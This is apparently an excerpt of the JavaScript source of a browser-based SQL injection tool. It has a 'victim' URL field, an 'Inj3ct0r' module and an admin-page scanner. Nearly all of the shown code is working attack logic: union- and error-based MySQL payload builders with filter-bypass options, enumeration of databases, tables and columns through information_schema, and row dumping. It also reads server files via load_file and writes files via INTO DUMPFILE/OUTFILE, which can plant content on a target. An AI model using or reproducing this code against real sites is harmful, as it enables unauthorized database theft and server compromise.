...
//2.nut error
IMG.push('data:image/gif;base64,%3D%3D');
...
<div id='main'>\
	...
	<div id='victim'></div>\
	<div id='submain'>\
		<div id='injector' alt='Injector'>coding...</div>\
		<div id='database' alt='Explore DB'>coding...</div>\
		<div id='loadfile' alt='LoadFile'>coding...</div>\
		<div id='writefile' alt='WriteFile'>coding...</div>\
		<div id='adminlink' alt='Link Admin' hiddenvictim='1'>coding...</div>\
	</div>\
</div>\
...
function SQLIAjax(dt,successfs,errorfs,sleep,type){
	setTimeout(function(){
		if(type == "success"){
			if(VICTIM['request']=='get'){
				$.ajax({
					url: dt,
					cache: true,
					success: successfs,
...
function global(){
	VICTIM['sleep'] = parseInt($.trim($("#sleeptime").val()));
	if(!$('#url').val())
	{
		alert('unknow victim!');
		return;
	...
	switch($("select[name='bypass'] option:selected").val())
	{
		case '1':
			VICTIM['bypass'] = 'hex';
			break;
...
function ActiveDBs(i)
{
	...
	if(i)
	{
		...
		Image($("#dblist #head"),i,"left");
		$("#dblist #body").css("background","");
	}else
	{
		$('#database').show("fast");
		Image(db,0,"left");
		Image($("#dblist #head"),0,"left");
		Image($("#selectdbs"),0,"left");
	}
	ActiveTBs("undefined",3);
}
function ErrorGetData(inject,count,callback)
{
	if(SQLI['ErrorData'].split(SQLI['stop']).length < 2)
	{
		var query = URL[0]+ SQLI[VICTIM['bypass']]['concat']+ "(" + t2h(SQLI['ErrorChar']) + ",substr(" +inject + ","+ count +",50)," + t2h(SQLI['ErrorChar']) +")"+ URL[1];
		SQLIAjax(query,
			function(xhr){
				SQLI['ErrorData'] += xhr.responseText.split(SQLI['ErrorChar'])[1];
				if(SQLI['ErrorData'] != ""){
...
{
	ActiveDBs(1);
	var dbsArray = dbs.split(SQLI['start'])[1].split(SQLI['stop'])[0].split(',');
	for (i=0; i<dbsArray.length; i++){
		$("#dblist #body").append("<div class='dbname active' id='db"+i+"'>"+dbsArray[i]+"</div>");
	}
}
function MySQLGetDBs()
{
	var injectdbs = "("+SQLI[VICTIM['bypass']]['select']+SQLI['space']+
	SQLI[VICTIM['bypass']]['concat']+"("+t2h(SQLI['start'])+","+
	"("+SQLI[VICTIM['bypass']]['unhex(hex']+
	"("+SQLI[VICTIM['bypass']]['concat']+"("+
	"@1:=("+SQLI[VICTIM['bypass']]['select']+SQLI['space']+SQLI[VICTIM['bypass']]['group_concat']+"("+SQLI[VICTIM['bypass']]['schema_name']+")"+SQLI['space']+SQLI[VICTIM['bypass']]['from']+SQLI['space']+SQLI[VICTIM['bypass']]['information_schema']+"."+SQLI[VICTIM['bypass']]['schemata']+"),IFNULL("+
	"@2:=("+SQLI[VICTIM['bypass']]['select']+SQLI['space']+SQLI[VICTIM['bypass']]['group_concat']+"("+SQLI[VICTIM['bypass']]['schema_name']+")"+SQLI['space']+SQLI[VICTIM['bypass']]['from']+SQLI['space']+SQLI[VICTIM['bypass']]['information_schema']+"."+SQLI[VICTIM['bypass']]['schemata']+SQLI['space']+SQLI[VICTIM['bypass']]['where']+SQLI['space']+"instr(@1,"+SQLI[VICTIM['bypass']]['schema_name']+")=0),(0x20)),IFNULL("+
	"@3:=("+SQLI[VICTIM['bypass']]['select']+SQLI['space']+SQLI[VICTIM['bypass']]['group_concat']+"("+SQLI[VICTIM['bypass']]['schema_name']+")"+SQLI['space']+SQLI[VICTIM['bypass']]['from']+SQLI['space']+SQLI[VICTIM['bypass']]['information_schema']+"."+SQLI[VICTIM['bypass']]['schemata']+SQLI['space']+SQLI[VICTIM['bypass']]['where']+SQLI['space']+"instr("+SQLI[VICTIM['bypass']]['concat']+"(@1,@2),"+SQLI[VICTIM['bypass']]['schema_name']+")=0),(0x20))"+
	"))))"+
	","+t2h(SQLI['stop'])+"))";
	
	if(VICTIM['method'] == 'union')
	{
		injectdbs = URL[0] + injectdbs + URL[1];
		SQLIAjax(injectdbs,
			AddDB,
	...
	{
		ErrorGetData(injectdbs,1,AddDB);
	}
}
/*******************************************
table function
*******************************************/
function ActiveTBs(dbid,i)
{
	var tb = $("#tblist #body");
	tb.html("");
	if(i)
	{
		Image($("#dblist #body #"+dbid),i,"right");
		Image($("#tblist #head"),i,"3px");
		$("#tblist #body").css("background","");
	}else
	{
		Image(tb,0,"left");
		Image($("#tblist #head"),0,"left");
		Image($("#dblist #body #"+dbid),0,"left");
		$("#tblist #head").html("Table: ");
	}
	ActiveCLs("undefined",3);
}
function AddTB(tbs){
	ActiveTBs(TMP['dbid'],1);
	tbsArray=tbs.split(SQLI['start'])[1].split(SQLI['stop'])[0].split('|')[1].split(',');
	for (i=0; i<tbsArray.length; i++){
		$("#tblist #body").append("<div class='tbname active' id='tb"+i+"'>"+tbsArray[i]+"</div>");
	}
}
function MySQLGetTBs(dbname,dbid)
{
	TMP['dbid'] = dbid;
	injecttbs = "("+SQLI[VICTIM['bypass']]['select']+SQLI['space']+
	SQLI[VICTIM['bypass']]['concat']+"("+
	"("+SQLI[VICTIM['bypass']]['unhex(hex']+"("+
	SQLI[VICTIM['bypass']]['concat']+"("+t2h(SQLI['start'])+","+
	"(@d:=trim("+t2h(dbname)+")),"+t2h("|")+","+
	SQLI[VICTIM['bypass']]['concat']+"("+
	"@1:=("+SQLI[VICTIM['bypass']]['select']+SQLI['space']+SQLI[VICTIM['bypass']]['group_concat']+"("+SQLI[VICTIM['bypass']]['table_name']+")"+SQLI['space']+SQLI[VICTIM['bypass']]['from']+SQLI['space']+SQLI[VICTIM['bypass']]['information_schema']+"."+SQLI[VICTIM['bypass']]['tables']+SQLI['space']+SQLI[VICTIM['bypass']]['where']+SQLI['space']+"table_schema=@d),IFNULL("+
	"@2:=("+SQLI[VICTIM['bypass']]['select']+SQLI['space']+SQLI[VICTIM['bypass']]['group_concat']+"("+SQLI[VICTIM['bypass']]['table_name']+")"+SQLI['space']+SQLI[VICTIM['bypass']]['from']+SQLI['space']+SQLI[VICTIM['bypass']]['information_schema']+"."+SQLI[VICTIM['bypass']]['tables']+SQLI['space']+SQLI[VICTIM['bypass']]['where']+SQLI['space']+"table_schema=@d"+SQLI['space']+"and"+SQLI['space']+"instr(@1,"+SQLI[VICTIM['bypass']]['table_name']+")=0),(0x20))"+
	")))))"+
	","+t2h(SQLI['stop'])+"))";
	if(VICTIM['method'] == 'union')
	{
		injecttbs = URL[0] + injecttbs + URL[1];
		SQLIAjax(injecttbs,
			AddTB,
			function (request, status, error) {
				ActiveTBs(dbid,2);
	...
	{
		ErrorGetData(injecttbs,1,AddTB);
	}
}
/*******************************************
column function
*******************************************/
function ActiveCLs(tbid,i)
{
	var cl = $("#cllist #body");
	cl.html("");
	if(i)
	{
		Image($("#tblist #body #"+tbid),i,"right");
		Image($("#cllist #head"),i,"3px");
		$("#cllist #body").css("background","");
	}else
	{
		$("#tblist #body .tbname").css("background","");
		Image(cl,0,"left");
		Image($("#cllist #head"),0,"left");
		Image($("#tblist #body #"+tbid),0,"left");
	}
	RestartBtn();
}
...
function RestartBtn()
{
	...
	$("#modbtn").html('table mod');
	$("#datalist #body").html("");
}

function AddCL(cls){
	ActiveCLs(TMP['tbid'],1);
	clsArray=cls.split(SQLI['start'])[1].split(SQLI['stop'])[0].split(',');
	for (i=0; i<clsArray.length; i++) {
		cl = clsArray[i].split('.');
		$("#cllist #body").append("<div class='clname active'><div class='clcheck'><input type='checkbox'></div><div id='cl"+i+"' class='cl' >"+cl[0]+"</div><div class='cltype'>"+h2t(cl[1])+"</div></div>");
	}
}

function MySQLGetCLs(tbname,tbid)
{
	TMP['tbid'] = tbid;
	injectcls = "("+SQLI[VICTIM['bypass']]['select']+SQLI['space']+SQLI[VICTIM['bypass']]['unhex(hex']+"("+
	SQLI[VICTIM['bypass']]['concat']+
	"((@t:=trim("+t2h(tbname)+")),"+
	t2h(SQLI['start'])+","+
	"@1:=("+SQLI[VICTIM['bypass']]['select']+SQLI['space']+SQLI[VICTIM['bypass']]['group_concat']+"("+SQLI[VICTIM['bypass']]['column_name']+","+t2h('.')+",hEx(COLUMN_TYPE))"+SQLI['space']+SQLI[VICTIM['bypass']]['from']+SQLI['space']+SQLI[VICTIM['bypass']]['information_schema']+"."+SQLI[VICTIM['bypass']]['columns']+SQLI['space']+SQLI[VICTIM['bypass']]['where']+SQLI['space']+SQLI[VICTIM['bypass']]['table_name']+"=@t),IFNULL("+
	"@2:=("+SQLI[VICTIM['bypass']]['select']+SQLI['space']+SQLI[VICTIM['bypass']]['group_concat']+"("+SQLI[VICTIM['bypass']]['column_name']+","+t2h('.')+",hEx(COLUMN_TYPE))"+SQLI['space']+SQLI[VICTIM['bypass']]['from']+SQLI['space']+SQLI[VICTIM['bypass']]['information_schema']+"."+SQLI[VICTIM['bypass']]['columns']+SQLI['space']+SQLI[VICTIM['bypass']]['where']+SQLI['space']+SQLI[VICTIM['bypass']]['table_name']+"=@t"+SQLI['space']+"and"+SQLI['space']+"instr(@1,"+SQLI[VICTIM['bypass']]['column_name']+")=0),(0x20))"+
	","+t2h(SQLI['stop'])+
	"))))";
	if(VICTIM['method'] == 'union')
	{
		injectcls = URL[0] + injectcls + URL[1];
		SQLIAjax(injectcls,
			AddCL,
			function (request, status, error) {
				ActiveCLs(tbid,2);
	...
	{
		ErrorGetData(injectcls,1,AddCL);
	}
}
/*******************************************
data function
...
function AddRW(data)
{
	var rw = data.split(SQLI['start'])[1].split(SQLI['stop'])[0].split(SQLI['mid']);
	for(i = 0; i < rw.length ; i++)
	{
		rw[i] = $("#tmp").text(rw[i]).html();
	}
	if(DATA['mod'] == 'table mod')
	{
...
function MySQLGetRWs()
{
	...
	var injectrow = "("+SQLI[VICTIM['bypass']]['select']+SQLI['space']+SQLI[VICTIM['bypass']]['unhex(hex']+"("+SQLI[VICTIM['bypass']]['concat']+"("+t2h(SQLI['start'])+",";
	for(c=0; c<DATA['columns'].length; c++) {
		injectrow += DATA['columns'][c][0] + "," + t2h(SQLI['mid']) + ",";
	}
	injectrow += t2h(SQLI['stop'])+")))"+SQLI['space']+SQLI[VICTIM['bypass']]['from']+SQLI['space']+DATA['database']+"."+DATA['table']+SQLI['space']+SQLI[VICTIM['bypass']]['limit']+SQLI['space']+DATA['count']+",1)";
	
	if(VICTIM['method'] == 'union')
	{
		injectrow = URL[0] + injectrow + URL[1];
		...
		ErrorGetData(injectrow,1,AddRW);
	}
}
/***********************************************************
insert data
************************************************************/
$("#database").html("<div id='dblist' class='explore'><div id='head'>DataBase List</div><div id='body'></div></div><div id='tblist' class='explore'><div id='head'>Table: </div><div id='body'></div></div><div id='cllist' class='explore'><div id='head'>Column: </div><div id='body' style='height: 160px;'></div><div id='foot' class='explore' style='width:99%;'></div></div><div id='datalist' class='explore' style='float: left; width: 100%;'><div id='head'> DATA </div><div id='body' style='height: 100%;'></div></div>");
...
$("#victim").html("<div class='explore' id='victimurl' style='width:50%;'><div id='head'>URL</div><div id='body'  style='height: 100px;'><textarea id='url' style='width: 95%; height: 90px;'></textarea></div><div style='width:99%;' class='explore' id='foot'><div class='button' id='geturibtn' >Get URI</div><div class='button' id='checksqlibtn'>Check SQLi</div><div class='button' id='inserterrorbtn'>Insert Error Base</div><div class='button' id='requestmethodbtn'>POST Method</div></div></div><div class='explore' id='info' style='width:49%;'><div id='head'>Info</div><div id='body' style='height: 100px;'><div>Method : <label for='method0'><input id='method0' type='radio' name='method' value='0' checked>Union</label><label for='method1'><input id='method1' type='radio' name='method' value='1'>Error Base</label></div><div>Type : <label for='type0'><input id='type0' type='radio' name='type' value='0' checked>MySQL</label><label for='type1'><input id='type1' type='radio' name='type' value='1'>MSSQL</label></div><div>Bypass : <select name='bypass'><option value='0'>None</option><option value='1'>hex</option><option value='2'>quote</option></select></div><div>Sleep Time: <input id='sleeptime' style='width: 30px;'type='text' value='3'/></div></div><div id='foot' class='explore' style='width:99%;'><div id='selectdbs' class='button'>Select DB</div><div id='setdefault' class='button'>Set Default</div><div id='loadinjectorbtn' class='button'>Injector</div></div></div>");
$("#cllist #foot").html("<div id='checkallbtn' class='button'>check all</div><div id='startbtn' class='button'>start</div><div id='modbtn' class='button'>table mod</div>");
...
$(".active").live({
	...
	mouseleave:function()
	{
		$(this).animate({ paddingLeft: '8px' }, 50);
...
$(".dbname").live("click",function(){
	ActiveTBs("undefined",0);
	var dbname = $.trim($(this).html());
	$("#tblist #head").html("DataBase: "+dbname);
	// global database
	DATA['database'] = dbname;
	MySQLGetTBs(dbname,$.trim($(this).attr('id')));
});
$(".tbname").live("click",function(){
	ActiveCLs("undefined",0);
	var tbname = $.trim($(this).html());
	$("#cllist #head").html("Table: "+tbname);
	//global table
	DATA['table'] = tbname;
	MySQLGetCLs(tbname,$.trim($(this).attr('id')));
});
...
$("#modbtn").live("click",function(){
	if($.trim($(this).html())=='table mod'){
		$(this).html("SQL mod");
	}else{
		$(this).html("table mod");
	}
	DATA['mod'] = $.trim($(this).html());
	// reset start button
	$("#startbtn").html('start');
});
$("#startbtn").live("click",function(){
	if($.trim($(this).html())=='start'){
		if(DATA['mod'] == 'table mod')
		{
			...
			var query = "create table "+ DATA['table']+"(";
			$("#datalist #body").html("<textarea id='CLsDatas' style='width: 98%; height: 250px;'></textarea>");
		}
		DATA['count'] = 0;
		var tbl = "";
		var cls = new Array();
		$("#cllist #body .clname").each(function(i,e){
			if($(this).find("input[type='checkbox']").attr("checked"))
			{
				var cl = $.trim($(this).find(".cl").html());
				var type = $.trim($(this).find(".cltype").html());
				cls.push([ cl , type ]);
				if(DATA['mod'] == 'table mod') 
				{
					tbl += cl+ ",";
		...
		if(DATA['mod'] == 'table mod')
		{
			...
			tbl = tbl.slice(0,-1);
			query += "\n);\ninsert into "+DATA['table']+"("+ tbl +") values";
			$("#CLsDatas").val(query);
		}
		DATA['columns'] = cls;
		$(this).html("pause");
...
function MySQLLoadFile(fname,callback){
	...
	var lf = SQLI[VICTIM['bypass']]['concat']+"("+t2h(SQLI['start'])+","+t2h(fname+SQLI['ErrorChar'])+","+SQLI[VICTIM['bypass']]['unhex(hex']+"("+SQLI[VICTIM['bypass']]['load_file']+"("+ t2h(fname) +"))),"+t2h(SQLI['stop'])+")";
...
function MySQLWriteFile(file_path,text,count) {
	...
	{
		case 0:{
			injectionwf=URL[0]+"("+SQLI[VICTIM['bypass']]['select']+SQLI['space']+t2h(text)+SQLI['space']+SQLI[VICTIM['bypass']]['into']+SQLI['space']+SQLI[VICTIM['bypass']]['dumpfile']+SQLI['space']+"'"+file_path+"')"+URL[1];
		...
		case 2:{
			injectionwf=URL[0]+"("+SQLI[VICTIM['bypass']]['select']+SQLI['space']+t2h(text)+SQLI['space']+SQLI[VICTIM['bypass']]['into']+SQLI['space']+SQLI[VICTIM['bypass']]['outfile']+SQLI['space']+"'"+file_path+"')"+URL[1];
...
$("#adminlink").html("<div style='width:100%;' id='adminscanmain' class='explore'><div id='head'>Admin Link Scaner</div><div style='height: auto;' id='body'><div id='adminscandir' class='explore' style='width: 25%'><div id='head'>Dir</div><div style='height: auto;' id='body'><textarea style='height: 255px; width: 90%;' id='dir'></textarea></div></div><div id='adminscanfile' class='explore' style='width: 25%'><div id='head'>File</div><div style='height: auto;' id='body'><textarea style='height: 255px; width: 90%;' id='file'></textarea></div></div><div id='adminscanlog' class='explore' style='width: 49%'><div id='head'>Log</div><div style='height: auto;' id='body'><textarea style='height: 255px; width: 95%;' id='log'></textarea></div></div><div id='adminscanavail' class='explore' style='width: 99%'><div id='head'>Available</div><div style='height: auto;' id='body'><textarea style='height: 150px; width: 97%;' id='avail'></textarea></div></div></div><div id='foot' class='explore' style='width:99%;'><div style='margin: 6px; float: left;'>Type:<input type='text' id='adminscanfiletype' value='php'></div><div style='margin: 6px; float: left;'>Sleep:<input type='text' id='adminscansleep' value='2' style='width: 20px;'></div><div style='margin: 6px; float: left;'>Dir only:<input type='checkbox' id='adminscandironly' checked></div><div style='margin: 6px; float: left;'>Advanced Scan:<input type='checkbox' id='adminscanadvanced' ></div><div id='adminscanbtn' class='button'>Scan</div></div></div>");
var SADMIN = {
'file': $("#adminscanfile #file"),
'dir': $("#adminscandir #dir"),
'log': $("#adminscanlog #log"),
'avail': $("#adminscanavail #avail"),
'dirid': 0,
'404':0,
'dironly' : 1,
'advanced': 0,
...
function AdminScanGlobal(){
	...
	if($("#adminscanadvanced").is(":checked")){
		SADMIN['advanced'] = 1;
		$.get("/CheckingByVinaKid/",function(data){
			SADMIN['dircheck'] = data.length;
			$.get("/CheckingByVinaKid."+SADMIN['filetype'][0],function(data){
				SADMIN['filecheck'] = data.length;
			});
		});
	}else{
		SADMIN['advanced'] = 0;
	...
	SADMIN['avail'].val("");
	SADMIN['404'] = 1;
	VICTIM['sleep'] = parseInt($.trim($("#adminscansleep").val()));
}
...
function AdminScanShowLog(type,link,status,tmp){ // sua lai cho show available thanh button click
	...
	if(type){
		...
		SADMIN['avail'].val(SADMIN['avail'].val()+log);
		SADMIN['404'] = 0;
	}else{
		...
		if(SADMIN['advanced']){
			SQLIAjax(link,
				function(xhr){
					...
					if(Math.abs(xhr.responseText.length - check) < 50){
...
function AdminScanDir(count){
	if(SADMIN['dironly'] || SADMIN['404']){
		SADMIN['dirid'] = count+1;
		AdminScanGetStatus(AdminDirList[count],AdminScanDir,count+1,0); // theme dir base vao
	}else{
		AdminScanGetStatus(AdminDirList[count-1]+AdminFileList[0],AdminScanFile,1,1);// theme dir base vao
	}
}
function AdminScanFile(count){
	if(AdminFileList[count] == "" || typeof AdminFileList[count] == "undefined"){
		AdminScanDir(SADMIN['dirid']+1);// theme dir base vao
	}else{
		AdminScanGetStatus(AdminDirList[SADMIN['dirid']-1]+AdminFileList[count],AdminScanFile,count+1,1);// theme dir base vao
	}
}
//============================
...
delete AdminDirList,AdminFileList;
/********************************
hook
********************************/
...
Injector
*****************************************************/
$("#injector").html("<div style='width:100%;' id='ijtmain' class='explore'><div id='head'>Inj3ct0r</div><div style='height: 300px;' id='body'><textarea id='ijtdata' style='width: 98%; height: 99%;'></textarea></div><div id='foot' class='explore' style='width:99%;'><div id='ijtpausebtn' class='button'>Write</div></div></div>");
...
function IjtLog(log,type){
	var t = "[-] ";
	if(type) t = "[+] "; 
	IJT['log'].val(IJT['log'].val()+t+log+"\n");
}
function IjtGetQuote(count){
	if(typeof QUOTE[count] == "undefined"){
		IjtLog("Cann't get quote",0);
		return;
	}
	var len = URL[0]+QUOTE[count][0]+SQLI['space']+SQLI[VICTIM['bypass']]['and']+SQLI['space']+"1=1"+IJT['end']+QUOTE[count][1]+ URL[1];
	var len1 = URL[0]+QUOTE[count][0]+SQLI['space']+SQLI[VICTIM['bypass']]['and']+SQLI['space']+"1=0"+IJT['end']+QUOTE[count][1]+ URL[1];
	SQLIAjax(len,
		function(xhr){
			SQLIAjax(len1,
				function(xhr1){
					if(Math.abs(xhr.responseText.length - xhr1.responseText.length) > 5){
						IjtLog("Get quote is success",1);
						IJT['quote'] = QUOTE[count];
						IjtOrderBy();
					}else{
						IjtGetQuote(count +1);
					}
...
function IjtOrderBy(){
	IjtLog("Get order by count ...",1);
	var len = URL[0]+IJT['quote'][0]+SQLI['space']+SQLI[VICTIM['bypass']]['order']+SQLI['space']+SQLI[VICTIM['bypass']]['by']+SQLI['space']+"99999"+IJT['end']+IJT['quote'][1]+ URL[1];
	IJT['ordercount'] = 10;
	SQLIAjax(len,
		function(xhr){
			IJT['tmp'] = xhr.responseText.length;
			IjtColumnLength(11);
		},
		function(){},
		VICTIM['sleep'],""
...
function IjtColumnLength(count){
	var len = URL[0]+IJT['quote'][0]+SQLI['space']+SQLI[VICTIM['bypass']]['order']+SQLI['space']+SQLI[VICTIM['bypass']]['by']+SQLI['space']+count+IJT['end']+IJT['quote'][1]+ URL[1];
	SQLIAjax(len,
		function(xhr){
			if(Math.abs(xhr.responseText.length - IJT['tmp']) < 50){//false
				IJT['ordercount'] = Math.floor(IJT['ordercount']/2);
				if(IJT['ordercount'] <= 0) IJT['ordercount'] =1; else IJT['ordercount']--;
				IjtColumnLength(count - IJT['ordercount']);
			}else{//true
				if(IJT['ordercount'] < 2){
					IjtLog("Get order by is success : "+count,1);
					IJT['len'] = count;
					IjtNumAvail();
				}else{
					IjtColumnLength(count + IJT['ordercount']);
		...
		if(VICTIM['request'] == 'get'){
			...
			$.ajax({
				...
				complete: function(xhr){
					if(Math.abs(xhr.responseText.length - IJT['tmp']) < 50){//false
						IJT['ordercount'] = Math.floor(IJT['ordercount']/2);
						if(IJT['ordercount'] ==0) IJT['ordercount'] =1;
						IjtColumnLength(count - IJT['ordercount']);
					}else{//true
						if(IJT['ordercount'] < 2){
							IjtLog("Get order by is success : "+count,1);
...
function IjtNumAvail(){
	var num ="";
	for(i=0;i < IJT['len'];i++){
		num+=SQLI[VICTIM['bypass']]['concat']+"("+t2h(SQLI['start'])+","+i+","+t2h(SQLI['start'])+"),";
	}
	var str = URL[0]+"999"+IJT['quote'][0]+SQLI['space']+SQLI[VICTIM['bypass']]['union']+SQLI['space']+SQLI[VICTIM['bypass']]['select']+SQLI['space']+num.slice(0,-1)+IJT['end']+IJT['quote'][1]+URL[1];
	SQLIAjax(str,
		function(xhr){
			var num = xhr.responseText.split(SQLI['start']);
			if(typeof num[1] == 'undefined'){
				IjtLog("No number is show",0);
			}else{
				IJT['numavail'] = parseInt(num[1]);
				IjtLog("Get number is success : "+IJT['numavail'],1);
				var qr ="";
				for(i=0;i < IJT['len'];i++){
					if(i == IJT['numavail']){
						qr += SQLI[VICTIM['bypass']]['concat']+"(SQLI),"
					}else{
						qr+=i+",";
					}
				}
				var str = URL[0]+"999"+IJT['quote'][0]+SQLI['space']+SQLI[VICTIM['bypass']]['union']+SQLI['space']+SQLI[VICTIM['bypass']]['select']+SQLI['space']+qr.slice(0,-1)+IJT['end']+IJT['quote'][1]+URL[1];
